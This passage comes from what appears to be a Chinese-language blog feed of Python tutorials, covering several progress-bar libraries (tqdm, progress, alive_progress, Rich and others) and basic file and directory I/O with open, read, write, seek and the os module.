title="带时间进度条"></a>带时间进度条</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> timescale <span class="token operator">=</span> <span class="token number">50</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start"</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span>scale <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>scale <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">"*"</span> <span class="token operator">*</span> i    b <span class="token operator">=</span> <span class="token string">"."</span> <span class="token operator">*</span> <span class="token punctuation">(</span>scale <span class="token operator">-</span> i<span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">/</span> scale<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span>    dur <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r{:^3.0f}%[{}->{}]{:.2f}s"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> dur<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"Done"</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span>scale <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Start<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">[</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token number">5.</span>50s<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Done<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></code></pre><h3 id="TQDM模块"><a href="#TQDM模块" class="headerlink" title="TQDM模块"></a>TQDM模块</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token comment" spellcheck="true"># 这里同样的，tqdm就是这个进度条最常用的一个方法</span><span class="token comment" spellcheck="true"># 里面存一个可迭代对象</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 模拟你的任务</span>  sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python"><span class="token number">100</span><span class="token operator">%</span><span class="token operator">|</span>██████████<span class="token operator">|</span> <span class="token number">499</span><span class="token operator">/</span><span class="token number">499</span> <span class="token punctuation">[</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">07</span><span class="token operator">&lt;</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">,</span> <span class="token number">63.</span>41it<span class="token operator">/</span>s<span class="token punctuation">]</span></code></pre><h3 id="progress-进度条"><a href="#progress-进度条" class="headerlink" title="progress 进度条"></a>progress 进度条</h3><p>文档：<a href="https://pypi.org/project/progress/">https://pypi.org/project/progress/</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> progress<span class="token punctuation">.</span>bar <span class="token keyword">import</span> Barbar <span class="token operator">=</span> Bar<span class="token punctuation">(</span><span class="token string">'Processing'</span><span class="token punctuation">,</span> max<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Do some work</span>    bar<span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>bar<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python">Processing <span class="token operator">|</span><span class="token comment" spellcheck="true">################################| 20/20</span></code></pre><p>例2</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">from</span> progress<span class="token punctuation">.</span>bar <span class="token keyword">import</span> IncrementalBarmylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span>bar <span class="token operator">=</span> IncrementalBar<span class="token punctuation">(</span><span class="token string">'Countdown'</span><span class="token punctuation">,</span> max<span class="token operator">=</span>len<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> mylist<span class="token punctuation">:</span>    bar<span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    bar<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python">Countdown <span class="token operator">|</span>████                            <span class="token operator">|</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">8</span>Countdown <span class="token operator">|</span>████████                        <span class="token operator">|</span> <span class="token number">2</span><span class="token operator">/</span><span class="token number">8</span>Countdown <span class="token operator">|</span>████████████                    <span class="token operator">|</span> <span class="token number">3</span><span class="token operator">/</span><span class="token number">8</span>Countdown <span class="token operator">|</span>████████████████                <span class="token operator">|</span> <span class="token number">4</span><span class="token operator">/</span><span class="token number">8</span>Countdown <span class="token operator">|</span>████████████████████            <span class="token operator">|</span> <span class="token number">5</span><span class="token operator">/</span><span class="token number">8</span>Countdown <span class="token operator">|</span>████████████████████████        <span class="token operator">|</span> <span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span>Countdown <span class="token operator">|</span>████████████████████████████    <span class="token operator">|</span> <span class="token number">7</span><span class="token operator">/</span><span class="token number">8</span></code></pre><h3 id="alive-progress"><a href="#alive-progress" class="headerlink" title="alive_progress"></a>alive_progress</h3><p>文档：<a href="https://github.com/rsalmei/alive-progress">https://github.com/rsalmei/alive-progress</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> alive_progress <span class="token keyword">import</span> alive_bar<span class="token keyword">import</span> time<span class="token comment" spellcheck="true"># retrieve your set of items</span>items <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># declare your expected total</span><span class="token keyword">with</span> alive_bar<span class="token punctuation">(</span>len<span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bar<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># iterate as usual</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># process each item</span>        bar<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python"><span class="token operator">|</span>███████████████████████████▎            <span class="token operator">|</span> ▆▄▂ <span class="token number">68</span><span class="token operator">/</span><span class="token number">100</span> <span class="token punctuation">[</span><span class="token number">68</span><span class="token operator">%</span><span class="token punctuation">]</span> <span class="token keyword">in</span> 7s <span class="token punctuation">(</span><span class="token number">9.2</span><span class="token operator">/</span>s<span class="token punctuation">,</span> eta<span class="token punctuation">:</span> 4s<span class="token punctuation">)</span> </code></pre><h3 id="PySimpleGUI库"><a href="#PySimpleGUI库" class="headerlink" title="PySimpleGUI库"></a>PySimpleGUI库</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> PySimpleGUI <span class="token keyword">as</span> sg<span class="token keyword">import</span> timecount <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    sg<span class="token punctuation">.</span>one_line_progress_meter<span class="token punctuation">(</span><span class="token string">'实时进度条'</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'-key-'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    代码    """</span>    <span class="token comment" spellcheck="true"># 假设这代码部分需要0.05s</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span></code></pre><p>效果</p><p><img src="https://lit.enomothem.com/zhixinghe/20220623155423.png"></p><h3 id="progressbar"><a href="#progressbar" class="headerlink" title="progressbar"></a>progressbar</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> progressbar <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timeprogress <span class="token operator">=</span> ProgressBar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> progress<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python"><span class="token number">100</span><span class="token operator">%</span> <span class="token operator">|</span><span class="token comment" spellcheck="true">########################################################################</span></code></pre><h3 id="Rich"><a href="#Rich" class="headerlink" title="Rich"></a>Rich</h3><p>文档：<a href="https://pypi.org/project/rich/">https://pypi.org/project/rich/</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> rich<span class="token punctuation">.</span>progress <span class="token keyword">import</span> track<span class="token keyword">import</span> time<span class="token keyword">for</span> step <span class="token keyword">in</span> track<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span></code></pre><p>效果</p><p><img src="https://lit.enomothem.com/zhixinghe/20220623160621.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进度条 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 10</title>
      <link href="posts/2542.html"/>
      <url>posts/2542.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Files-I-O-文件流"><a href="#Ax-Python-Files-I-O-文件流" class="headerlink" title="Ax Python Files I/O | 文件流"></a>Ax Python Files I/O | 文件流</h2><p>介绍基本的I/O函数。</p><h3 id="打印到屏幕"><a href="#打印到屏幕" class="headerlink" title="打印到屏幕"></a>打印到屏幕</h3><p>使用print函数，用逗号分隔表达式，输出到标准输出。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Python is really a great language,"</span><span class="token punctuation">,</span> <span class="token string">"isn't it?"</span><span class="token punctuation">)</span></code></pre><h3 id="读取键盘"><a href="#读取键盘" class="headerlink" title="读取键盘"></a>读取键盘</h3><p>有两个函数</p><ul><li>raw_input（python2）</li><li>input（python3）</li></ul><p>例</p><pre class=" language-python"><code class="language-python">str <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"Enter your input: "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Received input is : "</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Enter your input<span class="token punctuation">:</span> teReceived input <span class="token keyword">is</span> <span class="token punctuation">:</span>  te</code></pre><h3 id="打开和关闭文件"><a href="#打开和关闭文件" class="headerlink" title="打开和关闭文件"></a>打开和关闭文件</h3><h4 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h4><p>语法</p><pre class=" language-python"><code class="language-python">file object <span class="token operator">=</span> open<span class="token punctuation">(</span>file_name <span class="token punctuation">[</span><span class="token punctuation">,</span> access_mode<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span> buffering<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><strong>file_name</strong>: 文件名</p><p><strong>access_mode</strong>：打开的模式，读、写、追加等</p><p><strong>buffering</strong>：设置缓冲区。</p><p>模式列表</p><table><thead><tr><th align="center">Sr.No.</th><th align="center">Modes &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>r</strong>只读.</td></tr><tr><td align="center">2</td><td align="center"><strong>rb</strong> 二进制只读</td></tr><tr><td align="center">3</td><td align="center"><strong>r+</strong> 读写</td></tr><tr><td align="center">4</td><td align="center">**rb+**二进制读写</td></tr><tr><td align="center">5</td><td align="center"><strong>w</strong> 只写</td></tr><tr><td align="center">6</td><td align="center"><strong>wb</strong>二进制只写，无则创建，有则覆盖</td></tr><tr><td align="center">7</td><td align="center"><strong>w+</strong> 读写</td></tr><tr><td align="center">8</td><td align="center">**wb+**二进制读写</td></tr><tr><td align="center">9</td><td align="center"><strong>a</strong> 追加</td></tr><tr><td align="center">10</td><td align="center"><strong>ab</strong> 二进制追加</td></tr><tr><td align="center">11</td><td align="center">**a+**追加读</td></tr><tr><td align="center">12</td><td align="center">**ab+**二进制追加读</td></tr></tbody></table><h4 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h4><p>打开一个文件，你就有了一个文件对象，可以获得该文件的各种信息。</p><table><thead><tr><th align="center">Sr.No.</th><th align="center">Attribute &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>file.closed</strong> 文件是否关闭，是则true，否则false</td></tr><tr><td align="center">2</td><td align="center"><strong>file.mode</strong> 返回文件打开时的访问模式</td></tr><tr><td align="center">3</td><td align="center"><strong>file.name</strong> 返回文件名</td></tr><tr><td align="center">4</td><td align="center"><strong>file.softspace</strong> 为0表示在输出一数据后，要加上一个空格符，1 表示不加，python3移除</td></tr></tbody></table><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Open a file</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Name of the file: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token keyword">print</span> <span class="token string">"Closed or not : "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>closed<span class="token keyword">print</span> <span class="token string">"Opening mode : "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>mode<span class="token keyword">print</span> <span class="token string">"Softspace flag : "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>softspace</code></pre><p>执行 −</p><pre class=" language-python"><code class="language-python">Name of the file<span class="token punctuation">:</span> foo<span class="token punctuation">.</span>txtClosed <span class="token operator">or</span> <span class="token operator">not</span> <span class="token punctuation">:</span> <span class="token boolean">False</span>Opening mode <span class="token punctuation">:</span> wbSoftspace flag <span class="token punctuation">:</span> <span class="token number">0</span></code></pre><h4 id="close"><a href="#close" class="headerlink" title="close()"></a>close()</h4><p>清除还没有写入的信息并关闭对象。</p><p>语法</p><pre class=" language-python"><code class="language-python">fileObject<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Open a file</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Name of the file: "</span><span class="token punctuation">,</span> fo<span class="token punctuation">.</span>name<span class="token comment" spellcheck="true"># Close opend file</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Name of the file<span class="token punctuation">:</span> foo<span class="token punctuation">.</span>txt</code></pre><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="write"><a href="#write" class="headerlink" title="write()"></a>write()</h4><p>将任何字符串写入到文件中，末尾不会添加换行符。</p><p>语法</p><pre class=" language-python"><code class="language-python">fileObject<span class="token punctuation">.</span>write<span class="token punctuation">(</span>string<span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Open a file</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>fo<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"Python is a great language.\nYeah its great!!\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Close opend file</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>打开文件会发现一下内容</p><pre><code>Python is a great language.Yeah its great!!</code></pre><h4 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h4><p>读取文件字符串</p><p>语法</p><pre class=" language-python"><code class="language-python">fileObject<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>count是指定读取的数量，如果无则直到文件结束。</p><p>例</p><p>读取写时产生的那个文件的内容</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Open a file</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span>str <span class="token operator">=</span> fo<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">"Read String is : "</span><span class="token punctuation">,</span> str<span class="token comment" spellcheck="true"># Close opend file</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Read String <span class="token keyword">is</span> <span class="token punctuation">:</span> Python <span class="token keyword">is</span></code></pre><h3 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h3><p><em>tell()</em>  告诉你在文件中的当前位置</p><p><em>seek(offset[, from])</em> 更改文件的当前位置，offset是需要移动的字节数，from指定被移动时的位置，from为0则从开头开始，1表示当前位置，2表示结尾位置。</p><p>例</p><p>还是foo.txt</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Open a file</span>fo <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span>str <span class="token operator">=</span> fo<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Read String is : "</span><span class="token punctuation">,</span> str<span class="token comment" spellcheck="true"># Check current position</span>position <span class="token operator">=</span> fo<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Current file position : "</span><span class="token punctuation">,</span> position<span class="token comment" spellcheck="true"># Reposition pointer at the beginning once again</span>position <span class="token operator">=</span> fo<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>str <span class="token operator">=</span> fo<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Again read String is : "</span><span class="token punctuation">,</span> str<span class="token comment" spellcheck="true"># Close opend file</span>fo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Read String <span class="token keyword">is</span> <span class="token punctuation">:</span> Python <span class="token keyword">is</span>Current file position <span class="token punctuation">:</span> <span class="token number">10</span>Again read String <span class="token keyword">is</span> <span class="token punctuation">:</span> Python <span class="token keyword">is</span></code></pre><h4 id="重命名和删除文件"><a href="#重命名和删除文件" class="headerlink" title="重命名和删除文件"></a>重命名和删除文件</h4><p><strong>os</strong> module 提供了对文件的相关操作，你需要先导入该模块。这两个操作必须在文件关闭状态操作。否则会占用进程导致无法操作。</p><h4 id="rename"><a href="#rename" class="headerlink" title="rename()"></a>rename()</h4><p>语法，两个参数，当前文件名和新文件名。</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>current_file_name<span class="token punctuation">,</span> new_file_name<span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token comment" spellcheck="true"># Rename a file from test1.txt to test2.txt</span>os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span> <span class="token string">"test1.txt"</span><span class="token punctuation">,</span> <span class="token string">"test2.txt"</span> <span class="token punctuation">)</span></code></pre><h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><p>语法</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token comment" spellcheck="true"># Delete file test2.txt</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"text2.txt"</span><span class="token punctuation">)</span></code></pre><h3 id="目录的操作"><a href="#目录的操作" class="headerlink" title="目录的操作"></a>目录的操作</h3><p><strong>os</strong>模块还可以对目录进行操作。</p><h4 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir()"></a>mkdir()</h4><p>创建一个目录</p><p>语法</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">"newdir"</span><span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token comment" spellcheck="true"># Create a directory "test"</span>os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span></code></pre><h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h4><p>更改当前目录</p><p>语法</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">"newdir"</span><span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token comment" spellcheck="true"># Changing a directory to "/home/newdir"</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">"/home/newdir"</span><span class="token punctuation">)</span></code></pre><h4 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a>getcwd()</h4><p>显示当前目录</p><p>语法</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token comment" spellcheck="true"># This would give location of the current directory</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir()"></a>rmdir()</h4><p>删除目录</p><p>语法</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>rmdir<span class="token punctuation">(</span><span class="token string">'dirname'</span><span class="token punctuation">)</span></code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token comment" spellcheck="true"># This would  remove "/tmp/test"  directory.</span>os<span class="token punctuation">.</span>rmdir<span class="token punctuation">(</span> <span class="token string">"/tmp/test"</span>  <span class="token punctuation">)</span></code></pre><p>更多<strong>os</strong>和<strong>file</strong>的方法</p><p>file <a href="https://www.tutorialspoint.com/python/file_methods.htm">go</a></p><p>os <a href="https://www.tutorialspoint.com/python/os_file_methods.htm">go</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> I/O </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 9</title>
      <link href="posts/443.html"/>
      <url>posts/443.html</url>
      
